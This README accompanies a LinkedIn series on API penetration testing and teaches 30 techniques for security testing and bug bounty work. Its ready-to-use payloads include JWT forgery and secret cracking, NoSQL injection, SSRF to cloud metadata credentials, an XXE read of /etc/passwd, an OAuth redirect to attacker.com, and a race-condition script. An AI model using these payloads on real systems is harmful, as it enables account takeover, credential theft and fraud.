# 🔐 30 Days of API Security Testing

> A 30-day LinkedIn series covering one real API testing technique every single day.
> No fluff. No polls. No stories. Pure technical content.

---

## 🚀 About This Series

I just started this **30-day API security testing challenge on LinkedIn**.

Every day I post **one real API testing technique** — with HTTP requests, payloads, and step-by-step methodology you can actually use. This repository is the companion reference so you never lose the content.

**The series is actively in progress. New techniques are added daily.**

📌 **Follow along on LinkedIn:** [Your LinkedIn Profile URL]

---

## 📋 Table of Contents

- [Week 1 — Authentication & Authorization Attacks](#week-1--authentication--authorization-attacks)
- [Week 2 — Injection & Input Manipulation](#week-2--injection--input-manipulation)
- [Week 3 — Configuration, Recon & Logic Flaws](#week-3--configuration-recon--logic-flaws)
- [Week 4 — Advanced Techniques & Full Methodology](#week-4--advanced-techniques--full-methodology)
- [Tools Reference](#️-tools-reference)
- [Resources](#-resources)

---

## Week 1 — Authentication & Authorization Attacks

| Day | Technique | Category | Severity |
|-----|-----------|----------|----------|
| [Day 01](#day-01--bola--broken-object-level-authorization) | BOLA — Broken Object Level Authorization | AUTH | 🔴 Critical |
| [Day 02](#day-02--bfla--broken-function-level-authorization) | BFLA — Broken Function Level Authorization | AUTH | 🔴 Critical |
| [Day 03](#day-03--jwt-algnone-attack) | JWT alg:none Attack | AUTH | 🔴 Critical |
| [Day 04](#day-04--jwt-secret-brute-force) | JWT Secret Brute Force | AUTH | 🔴 Critical |
| [Day 05](#day-05--jwt-algorithm-confusion-rs256--hs256) | JWT Algorithm Confusion (RS256 → HS256) | AUTH | 🔴 Critical |
| [Day 06](#day-06--api-key-leakage-via-js-files) | API Key Leakage via JS Files | RECON | 🟠 High |
| [Day 07](#day-07--oauth-token-hijacking) | OAuth Token Hijacking | AUTH | 🔴 Critical |

---

## Week 2 — Injection & Input Manipulation

| Day | Technique | Category | Severity |
|-----|-----------|----------|----------|
| [Day 08](#day-08--nosql-injection-in-api-parameters) | NoSQL Injection in API Parameters | INJECT | 🔴 Critical |
| [Day 09](#day-09--mass-assignment-attack) | Mass Assignment Attack | LOGIC | 🔴 Critical |
| [Day 10](#day-10--ssrf-via-api-url-parameters) | SSRF via API URL Parameters | INJECT | 🔴 Critical |
| [Day 11](#day-11--http-method-override) | HTTP Method Override | LOGIC | 🟠 High |
| [Day 12](#day-12--server-side-template-injection-via-api) | Server-Side Template Injection via API | INJECT | 🔴 Critical |
| [Day 13](#day-13--graphql-introspection-abuse) | GraphQL Introspection Abuse | RECON | 🟡 Medium |
| [Day 14](#day-14--graphql-batching-attack) | GraphQL Batching Attack | INJECT | 🟠 High |

---

## Week 3 — Configuration, Recon & Logic Flaws

| Day | Technique | Category | Severity |
|-----|-----------|----------|----------|
| [Day 15](#day-15--cors-misconfiguration-exploitation) | CORS Misconfiguration Exploitation | CONFIG | 🟠 High |
| [Day 16](#day-16--api-rate-limit-bypass-techniques) | API Rate Limit Bypass Techniques | LOGIC | 🟠 High |
| [Day 17](#day-17--excessive-data-exposure-via-api-response) | Excessive Data Exposure via API Response | CONFIG | 🟠 High |
| [Day 18](#day-18--api-versioning-downgrade-attack) | API Versioning Downgrade Attack | RECON | 🟠 High |
| [Day 19](#day-19--swagger--openapi-spec-exposure) | Swagger / OpenAPI Spec Exposure | RECON | 🟡 Medium |
| [Day 20](#day-20--api-race-condition-testing) | API Race Condition Testing | LOGIC | 🔴 Critical |
| [Day 21](#day-21--improper-asset-management--shadow-apis) | Improper Asset Management — Shadow APIs | RECON | 🟠 High |

---

## Week 4 — Advanced Techniques & Full Methodology

| Day | Technique | Category | Severity |
|-----|-----------|----------|----------|
| [Day 22](#day-22--xml-external-entity-injection-via-api) | XML External Entity Injection via API | INJECT | 🔴 Critical |
| [Day 23](#day-23--parameter-pollution-attack) | Parameter Pollution Attack | LOGIC | 🟠 High |
| [Day 24](#day-24--idor-in-file-download-apis) | IDOR in File Download APIs | AUTH | 🟠 High |
| [Day 25](#day-25--api-key-privilege-escalation) | API Key Privilege Escalation | AUTH | 🔴 Critical |
| [Day 26](#day-26--webhooks-ssrf-exploitation) | Webhooks SSRF Exploitation | INJECT | 🔴 Critical |
| [Day 27](#day-27--content-type-confusion-attack) | Content-Type Confusion Attack | LOGIC | 🟠 High |
| [Day 28](#day-28--api-endpoint-fuzzing-with-ffuf) | API Endpoint Fuzzing with ffuf | RECON | 🟡 Medium |
| [Day 29](#day-29--business-logic-bypass-in-api-flows) | Business Logic Bypass in API Flows | LOGIC | 🔴 Critical |
| [Day 30](#day-30--full-api-attack-chain--bug-chaining-for-p1) | Full API Attack Chain — Bug Chaining for P1 | LOGIC | 🔴 Critical |

---

## Technique Details

---

### Day 01 — BOLA — Broken Object Level Authorization

**Category:** AUTH | **OWASP:** API Security #1 | **CVSS:** 8.6 (High)

**What it is:**
An API endpoint returns data based on an object ID in the URL without verifying if the requester actually owns that object.

**How to test:**
```http
GET /api/v2/orders/1001   ← your order
GET /api/v2/orders/1002   ← someone else's order — if 200 OK, it's BOLA
```

**Steps:**
1. Find endpoints with object IDs: `/api/users/{id}`, `/api/orders/{id}`, `/api/files/{id}`
2. Create 2 accounts (User A & User B). Get an object belonging to User B.
3. Call the endpoint authenticated as User A with User B's object ID.
4. If data returns — BOLA confirmed. Document and report.

**Tools:** Burp Suite Repeater, Autorize extension

---

### Day 02 — BFLA — Broken Function Level Authorization

**Category:** AUTH | **OWASP:** API Security #5 | **CVSS:** 9.1 (Critical)

**What it is:**
Regular users can call admin-only API endpoints because the server only checks authentication, not the authorization level.

**How to test:**
```http
DELETE /api/v1/admin/users/9999
Authorization: Bearer <regular_user_token>
→ 200 OK = BFLA confirmed
```

**Steps:**
1. Map all endpoints — look for `/admin/`, `/internal/`, `/manage/`, `/superuser/`
2. Call admin endpoints with a regular user token (don't change the token)
3. Try all HTTP methods: GET, POST, PUT, PATCH, DELETE on every restricted endpoint

**Tools:** Burp Suite, Autorize extension, ffuf

---

### Day 03 — JWT alg:none Attack

**Category:** AUTH | **CVSS:** 9.8 (Critical)

**What it is:**
Some JWT libraries accept tokens with `alg: none` — meaning no signature is required. An attacker can forge any token with any claims.

**How to test:**
```python
# Original header
{"alg": "HS256", "typ": "JWT"}

# Modified header
{"alg": "none", "typ": "JWT"}

# Modified payload
{"sub": "user123", "role": "admin"}

# Send: header.payload.   (empty signature, trailing dot)
```

**Steps:**
1. Decode the JWT — read the `alg` field in the header
2. Change `alg` to `none`, `None`, `NONE`, `nOnE` (test all case variants)
3. Modify payload claims (role, admin, etc.) — re-encode as base64url
4. Send with empty signature: `header.payload.`

**Tools:** jwt_tool (`-X a`), jwt.io, Burp JWT Editor

---

### Day 04 — JWT Secret Brute Force

**Category:** AUTH | **CVSS:** 9.8 (Critical)

**What it is:**
HS256 JWTs are signed with a shared secret. If the secret is weak, it can be cracked offline with a wordlist.

**How to test:**
```bash
# hashcat (fastest)
hashcat -a 0 -m 16500 token.txt rockyou.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d rockyou.txt

# john the ripper
john token.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

**Steps:**
1. Confirm `alg: HS256` in JWT header (only symmetric algos are crackable this way)
2. Run hashcat with rockyou.txt — cracks weak secrets in under 5 minutes
3. Sign a forged token with the cracked secret using jwt.io — change role to admin

**Common weak secrets:** `secret`, `password`, `123456`, `jwt_secret`, company name, domain name

---

### Day 05 — JWT Algorithm Confusion (RS256 → HS256)

**Category:** AUTH | **CVSS:** 9.8 (Critical)

**What it is:**
Flip RS256 to HS256 and sign the token using the server's public key as the HMAC secret. Vulnerable servers verify it as valid.

**How to test:**
```bash
# 1. Get public key
GET /api/.well-known/jwks.json

# 2. Forge token — change alg to HS256
{"alg": "HS256"} + {"role": "admin"}

# 3. Sign with public key as HS256 secret
python3 jwt_tool.py <token> -X k -pk public_key.pem
```

**Steps:**
1. Fetch public key from `/jwks.json`, `/.well-known/jwks.json`, or `/oauth/jwks`
2. Change `alg` from RS256 to HS256 in the header
3. Sign using the public key as the HMAC secret
4. Send forged token — vulnerable server accepts it

**Tools:** jwt_tool (`-X k -pk public_key.pem`)

---

### Day 06 — API Key Leakage via JS Files

**Category:** RECON | **Severity:** High → Critical (depends on the key)

**What it is:**
Developers hardcode API keys, tokens, and secrets in frontend JavaScript bundles shipped to the browser.

**How to test:**
```bash
# Find all JS files
python3 LinkFinder.py -i https://target.com -o cli

# Run SecretFinder
python3 SecretFinder.py -i https://target.com/app.js -o cli

# Manual grep
grep -rE "(api_key|apikey|secret|token|password)=['\"][^'\"]{10,}" *.js
```

**What to look for:**
- AWS keys: `AKIA[A-Z0-9]{16}`
- Stripe live keys: `sk_live_[a-zA-Z0-9]{24}`
- GitHub tokens: `ghp_[a-zA-Z0-9]{36}`
- Slack webhooks: `hooks.slack.com/services/...`
- Firebase URLs: `*.firebaseio.com`

**Validation (AWS):**
```bash
aws sts get-caller-identity --profile found_key
# If returns account ID → valid key → Critical finding → Stop. Report.
```

**Tools:** LinkFinder, SecretFinder, TruffleHog, gitleaks

---

### Day 07 — OAuth Token Hijacking

**Category:** AUTH | **CVSS:** 9.0 (Critical)

**What it is:**
Manipulate the `redirect_uri` parameter in OAuth flows to steal authorization codes to an attacker-controlled domain.

**How to test:**
```http
GET /oauth/authorize?
  client_id=APP_ID&
  redirect_uri=https://attacker.com&   ← changed
  response_type=code&
  scope=read

→ Authorization code sent to attacker.com
```

**Steps:**
1. Intercept the OAuth authorization request in Burp Suite
2. Modify `redirect_uri` to your controlled domain
3. Test variations: URL encoding, adding extra paths, subdomain bypasses
4. If code is delivered to attacker domain — OAuth hijack confirmed

---

### Day 08 — NoSQL Injection in API Parameters

**Category:** INJECT | **CVSS:** 9.8 (Critical)

**What it is:**
Inject MongoDB operators into JSON API parameters to bypass authentication or exfiltrate data.

**How to test:**
```json
// Normal login
{"username": "admin", "password": "wrongpassword"}

// NoSQL injection — bypass auth
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
```

**Steps:**
1. Find API endpoints accepting JSON body with user-controlled fields
2. Inject MongoDB operators: `$gt`, `$ne`, `$regex`, `$where`
3. Test in username, password, search, and filter parameters

---

### Day 09 — Mass Assignment Attack

**Category:** LOGIC | **CVSS:** 9.1 (Critical)

**What it is:**
Add undocumented parameters like `"role": "admin"` to API request bodies. Servers that auto-bind request data to models accept them silently.

**How to test:**
```json
// Normal registration
{"name": "John", "email": "john@test.com", "password": "pass"}

// Mass assignment attempt
{"name": "John", "email": "john@test.com", "password": "pass",
 "role": "admin", "isVerified": true, "credits": 999999}
```

**Steps:**
1. Find POST/PUT endpoints that create or update objects
2. Add extra undocumented fields from the API response body
3. Check if the server silently accepts and applies the extra fields

---

### Day 10 — SSRF via API URL Parameters

**Category:** INJECT | **CVSS:** 9.8 (Critical)

**What it is:**
Inject internal IP addresses into API parameters that accept URLs — webhook URLs, import endpoints, PDF generators.

**How to test:**
```http
POST /api/webhooks
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

POST /api/import
{"source_url": "http://internal-service.local/admin"}
```

**Cloud metadata endpoints to target:**
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/`
- Azure: `http://169.254.169.254/metadata/instance`

---

### Day 11 — HTTP Method Override

**Category:** LOGIC | **CVSS:** 7.5 (High)

**What it is:**
Use special headers to override the HTTP method. Firewalls that only allow GET/POST can be bypassed this way.

**How to test:**
```http
POST /api/admin/users/999
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
_method=DELETE   ← query parameter variant
```

---

### Day 12 — Server-Side Template Injection via API

**Category:** INJECT | **CVSS:** 9.8 (Critical)

**What it is:**
Inject template engine payloads into API string fields. If the server renders the value using a template engine, code executes.

**How to test:**
```json
{"name": "{{7*7}}"}          ← Jinja2/Twig — if response shows 49, SSTI confirmed
{"title": "${7*7}"}           ← FreeMarker
{"bio": "<%= 7*7 %>"}         ← ERB (Ruby)
{"message": "#{7*7}"}         ← Ruby interpolation
```

---

### Day 13 — GraphQL Introspection Abuse

**Category:** RECON | **CVSS:** 5.3 (Medium)

**What it is:**
Query the GraphQL schema to discover all types, queries, mutations, and fields — including hidden admin operations.

**How to test:**
```graphql
# Full schema dump
{__schema{types{name fields{name type{name}}}}}

# Find all queries and mutations
{__schema{queryType{fields{name description}}mutationType{fields{name}}}}
```

---

### Day 14 — GraphQL Batching Attack

**Category:** INJECT | **CVSS:** 7.5 (High)

**What it is:**
Send multiple GraphQL mutations in a single request to bypass rate limiting and brute force credentials or OTPs.

**How to test:**
```json
[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"}
]
```

Send 100+ mutations in one request — rate limiter sees 1 request, server processes 100.

---

### Day 15 — CORS Misconfiguration Exploitation

**Category:** CONFIG | **CVSS:** 8.1 (High)

**What it is:**
If `Access-Control-Allow-Origin` reflects arbitrary origins, any website can read API responses cross-domain.

**How to test:**
```http
GET /api/user/profile
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: https://attacker.com   ← reflects origin
Access-Control-Allow-Credentials: true              ← credentials included = Critical
```

---

### Day 16 — API Rate Limit Bypass Techniques

**Category:** LOGIC | **CVSS:** 7.5 (High)

**Bypass techniques:**
```http
X-Forwarded-For: 1.2.3.4          ← rotate IPs
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

# Null byte padding
{"email": "admin@test.com\u0000x"}   ← treated as different email

# Parameter variation
?email=admin@test.com
?email=admin%40test.com
?Email=admin@test.com
```

---

### Day 17 — Excessive Data Exposure via API Response

**Category:** CONFIG | **CVSS:** 7.5 (High)

**What it is:**
APIs return full data objects and rely on the frontend to filter. Raw API responses contain sensitive fields not shown in the UI.

**How to test:**
1. Browse the app normally through Burp Suite
2. Compare raw API JSON responses to what the UI displays
3. Look for: password hashes, tokens, PII, internal IDs, admin flags in hidden fields

---

### Day 18 — API Versioning Downgrade Attack

**Category:** RECON | **CVSS:** 7.5 (High)

**What it is:**
Older API versions (`/v1`) lack security patches present in newer versions (`/v3`). Test deprecated endpoints.

**How to test:**
```
App uses:   /api/v3/users/profile
Test:       /api/v2/users/profile
            /api/v1/users/profile
            /api/users/profile         ← no version
            /api/beta/users/profile
            /api/internal/users/profile
```

---

### Day 19 — Swagger / OpenAPI Spec Exposure

**Category:** RECON | **CVSS:** 5.3 (Medium)

**What it is:**
An exposed API spec gives an attacker the complete blueprint of your API — every endpoint, parameter, and response schema.

**Common paths to check:**
```
/swagger.json
/swagger-ui.html
/api-docs
/api/swagger.json
/openapi.json
/v1/swagger.json
/v2/api-docs
```

---

### Day 20 — API Race Condition Testing

**Category:** LOGIC | **CVSS:** 9.0 (Critical)

**What it is:**
Send simultaneous requests to exploit TOCTOU (Time Of Check to Time Of Use) windows — use coupons multiple times, transfer more than your balance.

**How to test:**
```python
import concurrent.futures
import requests

def redeem_coupon():
    return requests.post('/api/coupon/redeem', json={"code": "SAVE50"}, headers=auth)

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(redeem_coupon) for _ in range(50)]
```

**Burp Suite:** Use Turbo Intruder with `race.py` template for HTTP/2 single-packet attack.

---

### Day 21 — Improper Asset Management — Shadow APIs

**Category:** RECON | **CVSS:** 7.5 (High)

**What it is:**
Forgotten test, staging, or beta API endpoints that are still live in production with no security controls.

**How to test:**
```bash
# Fuzz API paths
ffuf -w wordlist.txt -u https://target.com/api/FUZZ

# Common shadow API paths
/api/test/
/api/beta/
/api/staging/
/api/internal/
/api/debug/
/api/v0/
/api/mobile/
```

---

### Day 22 — XML External Entity Injection via API

**Category:** INJECT | **CVSS:** 9.8 (Critical)

**What it is:**
Send XML payloads to APIs that parse XML to read internal files or trigger SSRF via external entity references.

**How to test:**
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>
```

Change `Content-Type` to `application/xml` on endpoints that accept JSON — some parsers handle both.

---

### Day 23 — Parameter Pollution Attack

**Category:** LOGIC | **CVSS:** 7.5 (High)

**What it is:**
Submit duplicate parameters and let inconsistent parsing between frontend and backend create unexpected behavior.

**How to test:**
```
# HTTP Parameter Pollution
GET /api/transfer?amount=100&amount=0

# JSON Parameter Pollution
{"role": "user", "role": "admin"}   ← last value wins in some parsers

# Query + Body pollution
POST /api/update?role=admin
Body: {"role": "user"}
```

---

### Day 24 — IDOR in File Download APIs

**Category:** AUTH | **CVSS:** 7.5 (High)

**What it is:**
Manipulate file IDs or names in download endpoints to access files belonging to other users.

**How to test:**
```http
GET /api/files/download/abc123-your-file.pdf
GET /api/files/download/abc124-other-user-file.pdf   ← sequential/guessable IDs
GET /api/export/report?reportId=1001   → change to 1002
```

---

### Day 25 — API Key Privilege Escalation

**Category:** AUTH | **CVSS:** 9.1 (Critical)

**What it is:**
Low-scope API keys used against high-privilege endpoints. Servers often check if the key is valid — not what scope it has.

**How to test:**
```http
# Key issued with read scope only
GET /api/admin/users        ← test high-priv endpoint with low-priv key
DELETE /api/admin/users/99  ← should fail but often doesn't
POST /api/admin/settings    ← check all methods
```

---

### Day 26 — Webhooks SSRF Exploitation

**Category:** INJECT | **CVSS:** 9.8 (Critical)

**What it is:**
Register webhook URLs pointing to internal services or cloud metadata endpoints to exfiltrate credentials.

**How to test:**
```json
POST /api/webhooks/create
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

{"url": "http://internal-admin.local/api/users"}
{"url": "http://10.0.0.1/admin"}
```

---

### Day 27 — Content-Type Confusion Attack

**Category:** LOGIC | **CVSS:** 7.5 (High)

**What it is:**
Switch the Content-Type header to a different format — some APIs accept multiple content types and behave differently for each.

**How to test:**
```http
# Original request (JSON)
Content-Type: application/json
{"username": "admin", "password": "test"}

# Change to form-encoded
Content-Type: application/x-www-form-urlencoded
username=admin&password=test

# Change to XML
Content-Type: application/xml
<login><username>admin</username><password>test</password></login>
```

---

### Day 28 — API Endpoint Fuzzing with ffuf

**Category:** RECON | **CVSS:** Medium

**What it is:**
Discover undocumented, hidden, or legacy API endpoints by fuzzing paths with curated wordlists.

**Commands:**
```bash
# Basic path fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/FUZZ -mc 200,201,204,301,302,403

# HTTP method fuzzing
ffuf -w methods.txt -u https://target.com/api/users \
     -X FUZZ -mc 200,201,204

# Parameter fuzzing
ffuf -w params.txt -u "https://target.com/api/user?FUZZ=test" -mc 200
```

**Wordlists:** SecLists `/Discovery/Web-Content/api/`

---

### Day 29 — Business Logic Bypass in API Flows

**Category:** LOGIC | **CVSS:** 9.0 (Critical)

**What it is:**
Skip steps in multi-step API flows by replaying the final request directly — bypassing OTP verification, payment checks, or approval gates.

**How to test:**
```
Normal flow:
Step 1: POST /api/checkout/init       → get checkout_id
Step 2: POST /api/checkout/verify     → OTP verification
Step 3: POST /api/checkout/complete   → payment

Attack:
Skip Steps 1+2 → go directly to Step 3 with a guessed checkout_id
```

---

### Day 30 — Full API Attack Chain — Bug Chaining for P1

**Category:** LOGIC | **CVSS:** 10.0 (Critical)

**What it is:**
Individual bugs rated Medium become a Critical P1 report when chained together into a full attack path.

**Chain example:**
```
Step 1 — Recon:               Find exposed Swagger docs → full endpoint map
Step 2 — Shadow API:          Find /api/v1/internal/ endpoint in old version
Step 3 — BOLA:                Access other user's data via object ID manipulation
Step 4 — Excessive Exposure:  Response leaks internal service URL
Step 5 — SSRF:                Use leaked URL in webhook → reach cloud metadata
Step 6 — Key Leakage:         AWS IAM credentials leaked from metadata endpoint
Result: Full account takeover + cloud infrastructure access = P1 Critical
```

**The lesson:** Each individual bug may be Medium. Chained together = Critical P1 payout.

---

## 🛠️ Tools Reference

| Tool | Use Case | Link |
|------|----------|------|
| Burp Suite | Intercept, Replay, Fuzz | [portswigger.net/burp](https://portswigger.net/burp) |
| jwt_tool | All JWT attacks | [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) |
| LinkFinder | JS endpoint extraction | [github.com/GerbenJavado/LinkFinder](https://github.com/GerbenJavado/LinkFinder) |
| SecretFinder | API key hunting in JS | [github.com/m4ll0k/SecretFinder](https://github.com/m4ll0k/SecretFinder) |
| ffuf | Endpoint & param fuzzing | [github.com/ffuf/ffuf](https://github.com/ffuf/ffuf) |
| Autorize | BOLA/BFLA automation | Burp Extension |
| Postman | API exploration | [postman.com](https://postman.com) |
| TruffleHog | Secret scanning | [github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog) |

---

## 📚 Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks — API Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## ⭐ Support

If this series is helping you — drop a ⭐ on the repo and follow along on LinkedIn for daily posts!

📌 **LinkedIn:** [Your LinkedIn URL]
🐛 **HackerOne:** [Your HackerOne Profile]

---

*Made with 🔐 | Consistency beats perfection. Learn daily. Hunt daily.*
